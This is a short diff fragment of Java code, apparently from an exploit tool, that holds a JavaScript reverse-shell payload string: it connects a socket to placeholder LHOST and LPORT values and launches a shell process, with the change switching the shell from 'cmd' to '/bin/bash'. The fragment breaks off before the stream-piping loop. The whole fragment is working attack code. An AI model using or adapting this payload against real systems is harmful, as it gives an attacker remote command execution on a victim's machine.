@@ -1,6 +1,6 @@
 String command = "var host = 'LHOST';" +
                        "var port = LPORT;" +
-                       "var cmd = 'cmd';"+
+                       "var cmd = '/bin/bash';"+
                        "var s = new java.net.Socket(host, port);" +
                        "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                        "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
